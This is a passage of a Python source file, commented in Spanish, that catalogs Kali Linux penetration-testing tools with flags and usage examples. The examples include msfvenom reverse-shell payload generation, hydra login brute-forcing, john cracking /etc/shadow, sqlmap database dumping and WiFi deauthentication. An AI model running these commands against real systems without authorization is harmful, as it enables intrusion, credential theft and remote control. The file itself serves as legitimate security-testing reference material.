"""
coder_kali/tools_database.py - Base de Conocimiento y Scraper Oficial de Herramientas de Kali Linux.
Extrae y cataloga herramientas, sintaxis de comandos, flags y descripciones desde https://www.kali.org/tools/
"""

import os
import json
import re
import urllib.request
import urllib.error
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Any
from rich.console import Console

console = Console()

CONFIG_DIR = Path.home() / ".config" / "blood-cipher"
if not CONFIG_DIR.exists() and (Path.home() / ".config" / "coder-kali").exists():
    CONFIG_DIR = Path.home() / ".config" / "coder-kali"
TOOLS_CACHE_FILE = CONFIG_DIR / "kali_tools.json"
BASE_KALI_TOOLS_URL = "https://www.kali.org/tools/"
BASE_BLACKARCH_TOOLS_URL = "https://blackarch.org/tools.html"


def detect_linux_distro() -> Dict[str, str]:
    """Detecta si el sistema es Kali/Debian o Arch/BlackArch."""
    info = {"id": "linux", "name": "Linux", "pkg_manager": "apt"}
    os_release = Path("/etc/os-release")
    if os_release.exists():
        try:
            content = os_release.read_text(encoding="utf-8")
            for line in content.splitlines():
                if line.startswith("ID="):
                    info["id"] = line.split("=", 1)[1].strip('"').lower()
                elif line.startswith("NAME="):
                    info["name"] = line.split("=", 1)[1].strip('"')
        except Exception:
            pass

    if info["id"] in ["arch", "blackarch", "manjaro", "endeavouros", "artix"]:
        info["pkg_manager"] = "pacman"
    elif info["id"] in ["kali", "debian", "ubuntu", "pop", "mint"]:
        info["pkg_manager"] = "apt"
    elif info["id"] in ["fedora", "rhel", "centos"]:
        info["pkg_manager"] = "dnf"

    return info

# Base de datos pre-cargada con las herramientas más utilizadas de Kali Linux
CURATED_DEFAULT_TOOLS: Dict[str, Dict[str, Any]] = {
    "nmap": {
        "name": "nmap",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/nmap/",
        "summary": "Herramienta líder mundial para exploración de redes y auditoría de seguridad.",
        "description": "Nmap ('Network Mapper') es una utilidad gratuita y de código abierto para descubrimiento de redes y auditoría de seguridad.",
        "binaries": ["nmap", "nping", "ncat"],
        "usage_examples": [
            "nmap -sS -p- -T4 <objetivo>  # Escaneo sigiloso SYN de todos los puertos",
            "nmap -sV -sC -O -p 80,443 <objetivo>  # Detección de versiones, scripts NSE y OS",
            "nmap --script vuln <objetivo>  # Escaneo automático de vulnerabilidades conocidas",
            "nmap -sn 192.168.1.0/24  # Descubrimiento de hosts activos (Ping sweep)",
        ],
        "flags": {
            "-sS": "TCP SYN Scan (requiere sudo/root, sigiloso y rápido)",
            "-sT": "TCP Connect Scan (no requiere root)",
            "-sU": "UDP Scan para descubrir puertos DNS, SNMP, DHCP",
            "-sV": "Detección de versiones de servicios en puertos abiertos",
            "-sC": "Ejecuta los scripts por defecto del Nmap Scripting Engine (NSE)",
            "-O": "Detección remota de Sistema Operativo mediante TCP/IP fingerprinting",
            "-p-": "Escanear todos los 65535 puertos",
            "-T0 a -T5": "Plantillas de velocidad (T4 recomendado para redes rápidas)",
            "-oA <nombre>": "Guardar resultados en formato estándar, XML y grepable",
        },
    },
    "sqlmap": {
        "name": "sqlmap",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/sqlmap/",
        "summary": "Herramienta automática para detección y explotación de inyecciones SQL.",
        "description": "sqlmap automatiza el proceso de detectar y explotar fallos de inyección SQL y tomar el control de servidores de bases de datos.",
        "binaries": ["sqlmap"],
        "usage_examples": [
            "sqlmap -u 'http://target.com/page.php?id=1' --batch --banner",
            "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "sqlmap -u 'http://target.com/page.php?id=1' -D dbname --tables",
            "sqlmap -r request.txt -p id --level=5 --risk=3",
        ],
        "flags": {
            "-u <url>": "URL objetivo a auditar",
            "-r <file>": "Cargar petición HTTP completa desde archivo",
            "--dbs": "Enumerar todas las bases de datos del servidor",
            "--tables": "Listar tablas de una base de datos",
            "--dump": "Extraer las entradas de las tablas",
            "--batch": "Modo no interactivo, usar respuestas por defecto",
            "--random-agent": "Usar User-Agent HTTP aleatorio",
            "--tamper=<script>": "Usar scripts de evasión WAF",
        },
    },
    "hydra": {
        "name": "hydra",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/hydra/",
        "summary": "Craqueador de login de red ultra rápido con soporte para múltiples protocolos.",
        "description": "THC-Hydra es un paralelizador de login muy rápido que admite numerosos protocolos como SSH, FTP, HTTP, SMB, RDP, etc.",
        "binaries": ["hydra", "pw-inspector", "xhydra"],
        "usage_examples": [
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<objetivo>",
            "hydra -L users.txt -P passwords.txt ftp://<objetivo> -t 4",
            "hydra -l root -P pass.txt rdp://<objetivo>",
            "hydra -l admin -P pass.txt <objetivo> http-post-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect'",
        ],
        "flags": {
            "-l <user> / -L <file>": "Usuario único o lista de usuarios",
            "-p <pass> / -P <file>": "Contraseña única o diccionario de contraseñas",
            "-t <threads>": "Número de conexiones paralelas (por defecto 16)",
            "-v / -V": "Modo verbose / mostrar cada intento de login",
            "-f": "Terminar la ejecución al encontrar el primer par válido",
        },
    },
    "amass": {
        "name": "amass",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/amass/",
        "summary": "Mapeo de superficie de ataque y descubrimiento de activos/subdominios (OWASP).",
        "description": "Amass enumera subdominios y activos de red mediante scraping pasivo, OSINT y fuentes DNS públicas.",
        "binaries": ["amass"],
        "usage_examples": [
            "amass enum -passive -d target.com > /tmp/subs.txt  # Sintaxis moderna: redirección directa (v5+ no usa flag -o)",
            "amass enum -active -d target.com -brute -w /usr/share/wordlists/dirb/common.txt",
        ],
        "flags": {
            "enum": "Subcomando de enumeración",
            "-passive": "Modo pasivo OSINT (sin interacción directa)",
            "-active": "Modo activo con fuerza bruta",
            "-d <domain>": "Dominio objetivo",
            "-brute": "Habilitar fuerza bruta de subdominios",
        },
    },
    "subfinder": {
        "name": "subfinder",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/subfinder/",
        "summary": "Herramienta ultra rápida de descubrimiento pasivo de subdominios de ProjectDiscovery.",
        "description": "Subfinder descubre subdominios válidos usando fuentes pasivas en línea sin tocar el servidor de la víctima.",
        "binaries": ["subfinder"],
        "usage_examples": [
            "subfinder -d target.com -o /tmp/subs.txt -silent",
            "subfinder -d target.com -all -recursive",
        ],
        "flags": {
            "-d <domain>": "Dominio objetivo a escanear",
            "-o <file>": "Guardar resultados en archivo",
            "-silent": "Mostrar solo los subdominios encontrados",
            "-all": "Usar todas las fuentes disponibles",
        },
    },
    "assetfinder": {
        "name": "assetfinder",
        "category": "Information Gathering",
        "url": "https://github.com/tomnomnom/assetfinder",
        "summary": "Herramienta ligera y veloz en Go para encontrar dominios y subdominios relacionados.",
        "description": "Assetfinder recopila subdominios desde fuentes públicas como crt.sh, certspotter, archive.org, etc.",
        "binaries": ["assetfinder"],
        "usage_examples": [
            "assetfinder --subs-only target.com > /tmp/subs.txt",
            "assetfinder target.com | sort -u",
        ],
        "flags": {
            "--subs-only": "Filtrar para emitir únicamente subdominios del objetivo",
        },
    },
    "ffuf": {
        "name": "ffuf",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/ffuf/",
        "summary": "Fuzzing web ultra rápido en Go para directorios, parámetros y vhosts.",
        "description": "FFUF es una de las herramientas de fuzzing web más rápidas y versátiles para pentesting.",
        "binaries": ["ffuf"],
        "usage_examples": [
            "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 2026  # Filtrar respuestas con tamaño 2026 (SPAs/Vercel)",
            "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
            "ffuf -u https://target.com/ -H 'Host: FUZZ.target.com' -w vhosts.txt -fs 2026",
        ],
        "flags": {
            "-u <url>": "URL con la palabra clave FUZZ",
            "-w <wordlist>": "Ruta a la lista de palabras",
            "-fs <size>": "Filtrar (ignorar) respuestas con tamaño específico en bytes",
            "-fc <codes>": "Filtrar por códigos de estado HTTP (ej. -fc 404,403)",
            "-mc <codes>": "Emparejar solo con estos códigos de estado (ej. -mc 200,302)",
            "-t <threads>": "Número de hilos concurrentes (por defecto 40)",
        },
    },
    "gobuster": {
        "name": "gobuster",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/gobuster/",
        "summary": "Herramienta rápida de fuerza bruta de URIs, DNS y subdominios en Go.",
        "description": "Gobuster se utiliza para realizar fuerza bruta a URLs (directorios y archivos), subdominios DNS y vhosts.",
        "binaries": ["gobuster"],
        "usage_examples": [
            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt --exclude-length 2026",
            "gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        ],
        "flags": {
            "dir": "Modo de enumeración de directorios/archivos",
            "dns": "Modo de enumeración de subdominios",
            "--exclude-length <len>": "Excluir respuestas wildcard/catch-all con esa longitud (ej. --exclude-length 2026)",
            "-u <url>": "URL base objetivo",
            "-w <wordlist>": "Ruta a la lista de palabras",
            "-x <extensions>": "Extensiones de archivo a buscar separadas por comas (ej. php,txt,js)",
            "-t <threads>": "Número de hilos concurrentes (por defecto 10)",
        },
    },
    "metasploit-framework": {
        "name": "metasploit-framework",
        "category": "Exploitation Tools",
        "url": "https://www.kali.org/tools/metasploit-framework/",
        "summary": "La plataforma de pruebas de penetración y desarrollo de exploits más usada.",
        "description": "Metasploit Framework ofrece miles de exploits, payloads, encoders y módulos auxiliares para pruebas de penetración completas.",
        "binaries": ["msfconsole", "msfvenom", "msfdb"],
        "usage_examples": [
            "msfdb init && msfconsole  # Iniciar base de datos y consola de Metasploit",
            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o payload.elf",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe",
        ],
        "flags": {
            "msfconsole": "Consola interactiva principal",
            "msfvenom -p <payload>": "Especificar el payload a generar",
            "LHOST / LPORT": "Dirección IP y puerto local de escucha",
            "-f <format>": "Formato de salida (elf, exe, raw, python, c)",
        },
    },
    "nikto": {
        "name": "nikto",
        "category": "Vulnerability Analysis",
        "url": "https://www.kali.org/tools/nikto/",
        "summary": "Escáner de servidores web para detectar archivos peligrosos y desactualizaciones.",
        "description": "Nikto es un escáner de servidor web de código abierto que realiza pruebas exhaustivas contra servidores web para más de 6700 archivos potencialmente peligrosos.",
        "binaries": ["nikto"],
        "usage_examples": [
            "nikto -h http://target.com",
            "nikto -h http://target.com -ssl -p 443 -o scan.html -Format htm",
            "nikto -h target.com -Tuning 1,2,3",
        ],
        "flags": {
            "-h <host>": "Host o URL objetivo",
            "-p <port>": "Puerto específico",
            "-ssl": "Forzar conexión SSL/HTTPS",
            "-o <file> -Format <fmt>": "Guardar reporte en archivo (txt, html, xml, csv)",
        },
    },
    "wireshark": {
        "name": "wireshark",
        "category": "Sniffing & Spoofing",
        "url": "https://www.kali.org/tools/wireshark/",
        "summary": "Analizador de protocolos de red y captura de paquetes en tiempo real.",
        "description": "Wireshark es el analizador de protocolos de red más popular del mundo para resolución de problemas y análisis forense de red.",
        "binaries": ["wireshark", "tshark", "dumpcap"],
        "usage_examples": [
            "tshark -i eth0 -f 'tcp port 80' -w capture.pcap",
            "tshark -r capture.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.file_data",
            "sudo wireshark &",
        ],
        "flags": {
            "-i <interface>": "Interfaz de red a capturar",
            "-f <bpf_filter>": "Filtro de captura Berkeley Packet Filter (BPF)",
            "-Y <display_filter>": "Filtro de visualización (ej. http, dns, tcp.port==443)",
            "-r <file>": "Leer archivo pcap existente",
            "-w <file>": "Guardar captura en formato pcapng",
        },
    },
    "john": {
        "name": "john",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/john/",
        "summary": "John the Ripper: Craqueador de hashes de contraseñas de alta velocidad.",
        "description": "John the Ripper es un descifrador de contraseñas rápido y configurable, diseñado para detectar contraseñas débiles de Unix, Windows, ZIP, PDF, etc.",
        "binaries": ["john", "zip2john", "rar2john", "pdf2john", "ssh2john"],
        "usage_examples": [
            "zip2john protected.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash",
            "john --format=sha512crypt /etc/shadow",
            "john --show zip.hash",
        ],
        "flags": {
            "--wordlist=<path>": "Usar lista de palabras personalizada",
            "--format=<format>": "Especificar el tipo de hash (raw-md5, sha512crypt, nt, etc.)",
            "--rules": "Aplicar reglas de mutación de palabras",
            "--show": "Mostrar las contraseñas ya descifradas",
        },
    },
    "aircrack-ng": {
        "name": "aircrack-ng",
        "category": "Wireless Attacks",
        "url": "https://www.kali.org/tools/aircrack-ng/",
        "summary": "Suite completa de evaluación y auditoría de seguridad para redes Wi-Fi 802.11.",
        "description": "Aircrack-ng es una suite completa de herramientas para evaluar la seguridad de redes WiFi (WEP, WPA, WPA2-PSK).",
        "binaries": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng"],
        "usage_examples": [
            "sudo airmon-ng start wlan0  # Activar modo monitor",
            "sudo airodump-ng wlan0mon  # Escaneo de redes y clientes",
            "sudo airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon  # Capturar 4-way handshake",
            "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap",
        ],
        "flags": {
            "airmon-ng start/stop": "Habilitar/Deshabilitar modo monitor en la tarjeta WiFi",
            "airodump-ng -c <ch>": "Canal específico",
            "aireplay-ng -0 <deauths>": "Envío de tramas de desautenticación para forzar el handshake",
            "aircrack-ng -w <dict>": "Craqueo del handshake con diccionario",
        },
    },
    "wpscan": {
        "name": "wpscan",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/wpscan/",
        "summary": "Escáner de seguridad y vulnerabilidades para CMS WordPress.",
        "description": "WPScan es un escáner de seguridad de WordPress de código abierto escrito para profesionales de seguridad y administradores de blogs.",
        "binaries": ["wpscan"],
        "usage_examples": [
            "wpscan --url http://target.com --enumerate u,vp,vt",
            "wpscan --url http://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin",
            "wpscan --url http://target.com --api-token <YOUR_TOKEN>",
        ],
        "flags": {
            "--url <target>": "URL del sitio WordPress a escanear",
            "--enumerate [u,vp,vt,tt,cb]": "Enumerar usuarios (u), plugins vulnerables (vp), temas vulnerables (vt)",
            "--plugins-detection [mixed|passive|aggressive]": "Modo de detección de plugins",
            "--api-token <token>": "Token de WPVulnDB para ver datos de CVEs",
        },
    },
    "burpsuite": {
        "name": "burpsuite",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/burpsuite/",
        "summary": "Plataforma líder para pruebas de seguridad y auditoría en aplicaciones web.",
        "description": "Burp Suite es una plataforma integrada para realizar pruebas de seguridad en aplicaciones web, actuando como proxy HTTP/S.",
        "binaries": ["burpsuite"],
        "usage_examples": [
            "burpsuite &  # Iniciar interfaz gráfica de Burp Suite",
        ],
        "flags": {
            "Proxy": "Intercepta y modifica tráfico HTTP/HTTPS entre el navegador y el servidor",
            "Repeater": "Permite reenviar peticiones manuales con modificaciones",
            "Intruder": "Herramienta de automatización y ataques personalizados (Sniper, Battering Ram, Cluster Bomb)",
            "Decoder": "Codificación y decodificación de Base64, URL, HTML, Hex",
        },
    },
    "nuclei": {
        "name": "nuclei",
        "category": "Vulnerability Analysis",
        "url": "https://www.kali.org/tools/nuclei/",
        "summary": "Escáner de vulnerabilidades de última generación basado en plantillas YAML comunitarias.",
        "description": "Nuclei permite enviar peticiones a través de múltiples objetivos según plantillas comunitarias para descubrir CVEs, malas configuraciones y vulnerabilidades críticas.",
        "binaries": ["nuclei"],
        "usage_examples": [
            "nuclei -u https://target.com -t cves/ -severity critical,high",
            "nuclei -u https://target.com -tags tech,misconfig,exposure -o /tmp/nuclei_out.txt",
            "nuclei -l /tmp/subs.txt -as -o /tmp/nuclei_tech.txt",
        ],
        "flags": {
            "-u <target>": "URL o IP objetivo",
            "-l <list>": "Lista de URLs u objetivos",
            "-t <templates>": "Ruta o categoría de plantillas (cves, exposures, misconfiguration, default-logins)",
            "-severity <levels>": "Filtrar por severidad (info, low, medium, high, critical)",
            "-tags <tags>": "Filtrar por tags específicos (ex: cve2024, wordpress, rce, lfi)",
            "-o <file>": "Guardar resultados en archivo",
        },
    },
    "httpx": {
        "name": "httpx",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/httpx-toolkit/",
        "summary": "Toolkit HTTP multipropósito y veloz para sondeo y verificación de servicios web.",
        "description": "httpx ejecuta sondeos HTTP masivos con detección de tecnologías, códigos de estado, títulos y redirecciones.",
        "binaries": ["httpx", "httpx-toolkit"],
        "usage_examples": [
            "httpx -u https://target.com -title -status-code -tech-detect -server",
            "cat /tmp/subs.txt | httpx -silent -mc 200,301,302 > /tmp/alive_subs.txt",
        ],
        "flags": {
            "-u <url>": "URL o dominio objetivo",
            "-l <file>": "Lista de hosts/dominios",
            "-title": "Extraer título de la página HTML",
            "-tech-detect": "Detectar tecnologías instaladas (Wappalyzer integrado)",
            "-status-code": "Mostrar código de estado HTTP",
            "-silent": "Mostrar únicamente resultados limpios",
        },
    },
    "katana": {
        "name": "katana",
        "category": "Web Applications",
        "url": "https://github.com/projectdiscovery/katana",
        "summary": "Framework moderno de crawling y spidering web para mapear endpoints y APIs.",
        "description": "Katana rastrea páginas web dinámicas y SPAs extrayendo enlaces, endpoints JS y rutas de API.",
        "binaries": ["katana"],
        "usage_examples": [
            "katana -u https://target.com -d 3 -jc -o /tmp/katana_endpoints.txt",
            "katana -u https://target.com -headless -o /tmp/katana_spa.txt",
        ],
        "flags": {
            "-u <url>": "URL raíz a rastrear",
            "-d <depth>": "Profundidad máxima de rastreo",
            "-jc": "Analizar archivos JavaScript y endpoints en código estático",
            "-headless": "Usar navegador sin cabeza para renderizar SPAs (React, Vue, Angular)",
        },
    },
    "sqlmap": {
        "name": "sqlmap",
        "category": "Database Assessment",
        "url": "https://www.kali.org/tools/sqlmap/",
        "summary": "Herramienta automática líder mundial para detección y explotación de inyecciones SQL.",
        "description": "sqlmap automatiza el proceso de detección y explotación de fallos de inyección SQL y toma de control de servidores de bases de datos.",
        "binaries": ["sqlmap"],
        "usage_examples": [
            "sqlmap -u 'https://target.com/item.php?id=1' --batch --dbs",
            "sqlmap -r request.txt --level=3 --risk=2 --dbs",
            "sqlmap -u 'https://target.com/login' --forms --crawl=2",
        ],
        "flags": {
            "-u <url>": "URL objetivo con parámetros",
            "-r <file>": "Cargar petición HTTP capturada en archivo",
            "--dbs": "Enumerar bases de datos disponibles",
            "--tables -D <db>": "Enumerar tablas de una base de datos específica",
            "--batch": "Modo automático sin preguntar confirmaciones",
            "--risk=<1-3>": "Nivel de riesgo de las pruebas (1 seguro, 3 agresivo)",
            "--level=<1-5>": "Nivel de profundidad de las pruebas de inyección",
        },
    },
    "commix": {
        "name": "commix",
        "category": "Vulnerability Analysis",
        "url": "https://www.kali.org/tools/commix/",
        "summary": "Explotador y analizador automatizado de vulnerabilidades Command Injection.",
        "description": "Commix automatiza la detección y explotación de vulnerabilidades de inyección de comandos en aplicaciones web.",
        "binaries": ["commix"],
        "usage_examples": [
            "commix -u 'https://target.com/ping.php?ip=127.0.0.1' --batch",
            "commix -r req.txt --level=3",
        ],
        "flags": {
            "-u <url>": "URL objetivo",
            "--batch": "Ejecución desatendida sin prompts interactivos",
            "--os-shell": "Intentar obtener una shell de comandos interactiva en el servidor",
        },
    },
    "feroxbuster": {
        "name": "feroxbuster",
        "category": "Web Applications",
        "url": "https://www.kali.org/tools/feroxbuster/",
        "summary": "Herramienta de descubrimiento recursivo de contenido web escrita en Rust.",
        "description": "Feroxbuster es una herramienta multi-hilo rápida para enumeración recursiva de directorios y archivos.",
        "binaries": ["feroxbuster"],
        "usage_examples": [
            "feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,js --filter-size 2026",
            "feroxbuster -u https://target.com -d 2 -t 30",
        ],
        "flags": {
            "-u <url>": "URL objetivo",
            "-w <wordlist>": "Lista de palabras para fuzzing",
            "-x <extensions>": "Extensiones de archivo a buscar (ej. js,json,php,txt)",
            "--filter-size <size>": "Filtrar y descartar respuestas con longitud exacta en bytes",
            "-d <depth>": "Profundidad máxima de recursión",
        },
    },
    "arjun": {
        "name": "arjun",
        "category": "Web Applications",
        "url": "https://github.com/s0md3v/Arjun",
        "summary": "Suite de descubrimiento de parámetros HTTP ocultos para endpoints GET/POST/JSON.",
        "description": "Arjun encuentra parámetros de consulta no documentados ni visibles en endpoints web.",
        "binaries": ["arjun"],
        "usage_examples": [
            "arjun -u https://target.com/api/user -m GET",
            "arjun -u https://target.com/api/login -m POST --json",
        ],
        "flags": {
            "-u <url>": "URL del endpoint",
            "-m <method>": "Método HTTP a probar (GET, POST, JSON, XML)",
            "--json": "Enviar datos en formato JSON en el cuerpo",
        },
    },
    "trufflehog": {
        "name": "trufflehog",
        "category": "Information Gathering",
        "url": "https://github.com/trufflesecurity/trufflehog",
        "summary": "Buscador de secretos, claves de API, tokens y credenciales en repositorios y código.",
        "description": "TruffleHog escanea archivos, repositorios Git y sistemas de archivos en busca de credenciales expuestas y secretos filtrados con verificación en vivo.",
        "binaries": ["trufflehog"],
        "usage_examples": [
            "trufflehog git https://github.com/org/repo --only-verified",
            "trufflehog filesystem /ruta/a/proyecto",
        ],
        "flags": {
            "git <url>": "Escanear historial de un repositorio Git",
            "filesystem <path>": "Escanear directorio o archivos locales",
            "--only-verified": "Mostrar únicamente credenciales y claves cuya validez fue confirmada",
        },
    },
    "testssl": {
        "name": "testssl.sh",
        "category": "Vulnerability Analysis",
        "url": "https://www.kali.org/tools/testssl.sh/",
        "summary": "Herramienta exhaustiva de auditoría de cifrado SSL/TLS y certificados.",
        "description": "testssl.sh comprueba el soporte de cifrado de cualquier servidor, versiones TLS vulnerables (Heartbleed, POODLE, ROBOT, etc.) y debilidades de certificados.",
        "binaries": ["testssl", "testssl.sh"],
        "usage_examples": [
            "testssl https://target.com",
            "testssl --fast --vulnerabilities https://target.com",
        ],
        "flags": {
            "--fast": "Escaneo rápido omitiendo pruebas menores",
            "--vulnerabilities": "Verificar específicamente fallos conocidos (Heartbleed, CCS, ROBOT, etc.)",
        },
    },
    "hashcat": {
        "name": "hashcat",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/hashcat/",
        "summary": "Herramienta avanzada de recuperación de contraseñas con aceleración GPU (CUDA/OpenCL).",
        "description": "Hashcat es el craqueador de contraseñas más rápido del mundo, soportando cientos de algoritmos de hash y múltiples modos de ataque (diccionario, reglas, fuerza bruta, combinación, máscara).",
        "binaries": ["hashcat"],
        "usage_examples": [
            "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5 + diccionario",
            "hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt  # NTLM",
            "hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt  # SHA512crypt",
            "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a  # Fuerza bruta con máscara",
            "hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule  # Reglas de mutación",
        ],
        "flags": {
            "-m <mode>": "Tipo de hash (0=MD5, 100=SHA1, 1000=NTLM, 1400=SHA256, 1800=SHA512crypt, 3200=bcrypt)",
            "-a <mode>": "Modo de ataque (0=diccionario, 1=combinación, 3=fuerza bruta/máscara, 6=híbrido)",
            "-r <rules>": "Archivo de reglas de mutación (best64, dive, rockyou-30000)",
            "--show": "Mostrar las contraseñas ya descifradas del potfile",
            "--force": "Ignorar advertencias y ejecutar en cualquier hardware",
            "-o <file>": "Guardar contraseñas craqueadas en un archivo",
            "--potfile-disable": "No usar el archivo .potfile para esta sesión",
        },
    },
    "hash-identifier": {
        "name": "hash-identifier",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/hash-identifier/",
        "summary": "Identificador automático de tipos de hash para penetration testing.",
        "description": "hash-identifier analiza un hash y determina su posible algoritmo de cifrado (MD5, SHA1, SHA256, bcrypt, NTLM, etc.).",
        "binaries": ["hash-identifier"],
        "usage_examples": [
            "hash-identifier  # Modo interactivo",
            "echo '5f4dcc3b5aa765d61d8327deb882cf99' | hash-identifier",
        ],
        "flags": {},
    },
    "crunch": {
        "name": "crunch",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/crunch/",
        "summary": "Generador de wordlists personalizadas por longitud, charset y patrones.",
        "description": "Crunch permite crear diccionarios de contraseñas a medida especificando longitud mínima/máxima, juego de caracteres y patrones de formato.",
        "binaries": ["crunch"],
        "usage_examples": [
            "crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/wordlist.txt",
            "crunch 8 8 -t @@@@%%%% -o /tmp/custom.txt  # 4 letras + 4 números",
            "crunch 4 4 0123456789 | aircrack-ng -w - capture.cap -b <BSSID>  # PIN WPA en pipe",
        ],
        "flags": {
            "<min>": "Longitud mínima de las palabras generadas",
            "<max>": "Longitud máxima de las palabras generadas",
            "-t <pattern>": "Patrón de formato (@=minúscula, ,=mayúscula, %=número, ^=especial)",
            "-o <file>": "Archivo de salida para guardar el diccionario",
            "-p <words>": "Permutaciones de palabras específicas",
        },
    },
    "cewl": {
        "name": "cewl",
        "category": "Password Attacks",
        "url": "https://www.kali.org/tools/cewl/",
        "summary": "Generador de wordlists a partir del scraping de contenido de sitios web.",
        "description": "CeWL (Custom Word List generator) araña un sitio web objetivo y genera una lista de palabras personalizada basada en el contenido real del sitio, ideal para ataques de diccionario dirigidos.",
        "binaries": ["cewl"],
        "usage_examples": [
            "cewl https://target.com -d 2 -m 5 -w /tmp/cewl_wordlist.txt",
            "cewl https://target.com --with-numbers -a -e --email_file /tmp/emails.txt",
        ],
        "flags": {
            "-d <depth>": "Profundidad de rastreo (por defecto 2)",
            "-m <min>": "Longitud mínima de las palabras a recopilar",
            "-w <file>": "Archivo de salida para la wordlist",
            "--with-numbers": "Incluir palabras que contengan números",
            "-a": "Incluir metadata de archivos encontrados",
            "-e --email_file <file>": "Extraer direcciones de email del sitio",
        },
    },
    "enum4linux": {
        "name": "enum4linux",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/enum4linux/",
        "summary": "Enumeración de información de sistemas Windows/Samba vía SMB/NetBIOS.",
        "description": "enum4linux extrae usuarios, grupos, shares, políticas de contraseñas y más de sistemas Windows y servidores Samba mediante protocolos SMB y RPC.",
        "binaries": ["enum4linux", "enum4linux-ng"],
        "usage_examples": [
            "enum4linux -a <objetivo>  # Enumeración completa (usuarios, shares, políticas)",
            "enum4linux -U <objetivo>  # Listar usuarios vía RID cycling",
            "enum4linux -S <objetivo>  # Enumerar shares SMB accesibles",
        ],
        "flags": {
            "-a": "Enumeración completa (equivale a -U -S -G -P -r -o -n -i)",
            "-U": "Listar usuarios del dominio/sistema",
            "-S": "Enumerar shares (carpetas compartidas) SMB",
            "-G": "Listar grupos",
            "-P": "Obtener política de contraseñas del dominio",
            "-r": "Enumerar usuarios vía RID cycling",
        },
    },
    "netdiscover": {
        "name": "netdiscover",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/netdiscover/",
        "summary": "Herramienta activa/pasiva de descubrimiento de hosts ARP en redes locales.",
        "description": "Netdiscover escanea redes locales para descubrir hosts activos mediante peticiones ARP, útil en entornos DHCP y redes desconocidas.",
        "binaries": ["netdiscover"],
        "usage_examples": [
            "sudo netdiscover -i eth0  # Modo activo en la interfaz por defecto",
            "sudo netdiscover -i eth0 -r 192.168.1.0/24 -P -N  # Escaneo de rango específico, modo parseable",
            "sudo netdiscover -p  # Modo pasivo (solo escucha, sin enviar paquetes)",
        ],
        "flags": {
            "-i <iface>": "Interfaz de red a usar para el escaneo",
            "-r <range>": "Rango de red a escanear (ej. 192.168.1.0/24)",
            "-p": "Modo pasivo (solo captura tráfico ARP sin enviar peticiones)",
            "-P": "Modo imprimible (output en formato legible para scripting)",
            "-N": "No imprimir cabecera en modo -P",
        },
    },
    "arp-scan": {
        "name": "arp-scan",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/arp-scan/",
        "summary": "Scanner ARP de alto rendimiento para descubrimiento de hosts en redes locales.",
        "description": "arp-scan envía paquetes ARP a hosts de la red local y muestra las respuestas recibidas, incluyendo dirección MAC y fabricante del dispositivo.",
        "binaries": ["arp-scan"],
        "usage_examples": [
            "sudo arp-scan -l -I eth0  # Escaneo de toda la subred local",
            "sudo arp-scan 192.168.1.0/24 -I wlan0  # Escaneo de rango específico",
        ],
        "flags": {
            "-l": "Escanear automáticamente la subred local de la interfaz",
            "-I <iface>": "Especificar interfaz de red",
            "--localnet": "Sinónimo de -l, escanear red local",
        },
    },
    "masscan": {
        "name": "masscan",
        "category": "Information Gathering",
        "url": "https://www.kali.org/tools/masscan/",
        "summary": "Escáner de puertos TCP/UDP ultra rápido (puede escanear todo Internet en 5 minutos).",
        "description": "Masscan es el escáner de puertos más rápido del mundo, capaz de emitir 10 millones de paquetes por segundo, con sintaxis similar a Nmap.",
        "binaries": ["masscan"],
        "usage_examples": [
            "sudo masscan 192.168.1.0/24 -p 1-65535 --rate 10000",
            "sudo masscan <objetivo> -p 80,443,8080,8443 --rate 1000 -oJ /tmp/masscan.json",
        ],
        "flags": {
            "-p <ports>": "Puertos a escanear (soporta rangos y listas)",
            "--rate <pps>": "Velocidad de envío de paquetes por segundo",
            "-oJ <file>": "Guardar resultados en formato JSON",
            "-oG <file>": "Guardar resultados en formato grepable",
            "--banners": "Capturar banners de los servicios detectados",
        },
    },
    "naabu": {
        "name": "naabu",
        "category": "Information Gathering",
        "url": "https://github.com/projectdiscovery/naabu",
